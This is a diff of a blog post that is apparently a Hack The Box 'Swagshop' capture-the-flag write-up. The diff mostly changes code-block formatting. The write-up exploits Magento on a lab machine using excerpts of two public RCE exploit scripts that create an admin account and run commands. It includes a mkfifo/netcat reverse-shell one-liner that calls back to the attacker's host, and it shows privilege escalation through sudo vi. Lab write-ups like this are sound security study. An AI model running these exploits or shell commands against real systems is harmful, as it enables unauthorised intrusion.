@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Swagshop"
-date:   2019-09-29 10:00:00 +0800
-categories: hackthebox
-tags: magento linux vi
+title: Hack The Box - Swagshop
+date: 2019-09-29 10:00:00 +0800
+categories: [hackthebox]
+tags: [magento, linux, vi]
 ---
 This machine was not my first Linux machine but I had fun rooted this machine ! :D
 
@@ -15,14 +14,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 Always remember to map a domain name to the machine's IP address to ease your rooting !
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.140 swagshop.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sS swagshop.htb -p 1-65535 -T4
 Nmap scan report for swagshop.htb (10.10.10.140)
 Host is up (0.25s latency).
@@ -32,7 +31,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 1312.66 seconds
-{% endhighlight %}
+```
 
 Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, lets see if we can gather any information or exploit it ?
 
@@ -45,7 +44,7 @@ Not much can be done with the `ssh` service as we do not have any credentials on
 # Exploitation (1)
 
 Lets try to find some exploits for Magento
-{% highlight bash %}
+```bash
 $ searchsploit magento
 ---------------------------------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                                          |  Path
@@ -65,11 +64,11 @@ eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of S
 ---------------------------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
 Papers: No Result
-{% endhighlight %}
+```
 
 The one worked was `Magento eCommerce - Remote Code Execution`. Below is a slightly modified version.
 
-{% highlight python %}
+```python
 import requests
 import base64
 import sys
@@ -112,7 +111,7 @@ if r.ok:
     print "Check {0}/admin with creds {1}:{2}".format(target, username, password)
 else:
     print "DID NOT WORK"
-{% endhighlight %}
+```
 
 Before running the script, I checked whether `http://swagshop.htb/admin/Cms_Wysiwyg/directive/index/` was a valid URL. Unfortunately, it wasn't. Maybe we need to specify a base URL ?
 
@@ -128,16 +127,16 @@ To test my theory, I browsed to `http://swagshop.htb/index.php/admin` and I was 
 ![](/assets/images/swagshop6.png)
 
 So if we try appending `index.php` to the `target` variable in the script
-{% highlight python %}
+```python
 target = "http://swagshop.htb/index.php"
-{% endhighlight %}
+```
 
 and running the script, 
-{% highlight bash %}
+```bash
 $ python magento.py
 WORKED
 Check http://swagshop.htb/index.php/admin with creds try:again
-{% endhighlight %}
+```
 
 It worked ! Lets try to login as `try:again`.
 
@@ -146,12 +145,12 @@ It worked ! Lets try to login as `try:again`.
 # Exploitation (2)
 
 Alright! We got an administrative account which can pretty much have access to all the features on the website. Lets try to establish a foothold on the box which requires another exploit to be used. Back to our searchploit results, there was one exploit that required us to be authenticated.
-{% highlight bash %}
+```bash
 Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/37811.py
-{% endhighlight %}
+```
 
 I've configured the script in this way:
-{% highlight python %}
+```python
 #!/usr/bin/python
 # Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
 # Google Dork: "Powered by Magento"
@@ -231,49 +230,49 @@ try:
     request = br.open(exploit)
 except (mechanize.HTTPError, mechanize.URLError) as e:
     print e.read()
-{% endhighlight %}
+```
 
 For the `install_date` variable, it can be found in `http://swagshop.htb/app/etc/local.xml`. Now lets test it out with a `whoami` command. For the `target` variable, which is the first argument, it is the URL of the admin login page (`http://10.10.10.140.htb/index.php/admin`). Note that we cannot use the domain name `swagshop.htb` as we will always be redirected to `10.10.10.140` for some reason.
 
-{% highlight bash %}
+```bash
 $ python poc.py http://10.10.10.140/index.php/admin "whoami"
 www-data
-{% endhighlight %}
+```
 
 Great! Now lets our listener and establish a reverse shell connection!
 
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 $ python poc.py http://10.10.10.140/index.php/admin "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/g"
-{% endhighlight %}
+```
 
 As expected, we caught the reverse shell.
-{% highlight bash %}
+```bash
 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.140] 39904
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
-{% endhighlight %}
+```
 
 # Enumeration
 
 To quickly enumerate for possible privilege escalation vectors, I will using [LinEnum](https://github.com/rebootuser/LinEnum). To transfer it from my machine to this machine, I will be using `python`'s `SimpleHTTPServer` module.
 
 On my machine:
-{% highlight bash %}
+```bash
 $ mkdir httpserver
 $ cd httpserver
 $ cp ~/Downloads/LinEnum.sh .
 $ python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
-{% endhighlight %}
+```
 
 On the `Swagshop` machine:
-{% highlight bash %}
+```bash
 $ wget http://10.10.14.140/LinEnum.sh
 --2019-09-07 05:03:29--  http://10.10.14.140/LinEnum.sh
 Connecting to 10.10.14.140:80... connected.
@@ -286,7 +285,7 @@ Saving to: 'LinEnum.sh'
 2019-09-07 05:03:31 (82.5 KB/s) - 'LinEnum.sh' saved [45651/45651]
 $ chmod 777 LinEnum.sh
 $ ./LinEnum.sh
-{% endhighlight %}
+```
 
 `LinEnum.sh` revealed that `www-data` had sudo privileges.
 ```
@@ -303,7 +302,7 @@ User www-data may run the following commands on swagshop:
 
 # root.txt (1)
 `vi` actually has the ability to open a shell inside it by entering `:!bash`.
-{% highlight bash %}
+```bash
 $ sudo /usr/bin/vi /var/www/html/a
 ~
 :!bash
@@ -320,11 +319,11 @@ c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX
   |___|.__|       https://hackthebox.store/password
 
                    PS: Use root flag as password!
-{% endhighlight %}
+```
 
 # root.txt (2)
 If we create a symbolic link in `/var/www/html` that references the root flag, we will be able to trick `sudo` into thinking we are simply opening a file in `/var/www/html/` with `vi`!
-{% highlight bash %}
+```bash
 $ ln -s /root/root.txt /var/www/html/root.txt
 $ sudo vi /var/www/html/root.txt
 c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX
@@ -337,6 +336,6 @@ c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX
   |___|.__|       https://hackthebox.store/password
 
                    PS: Use root flag as password!
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
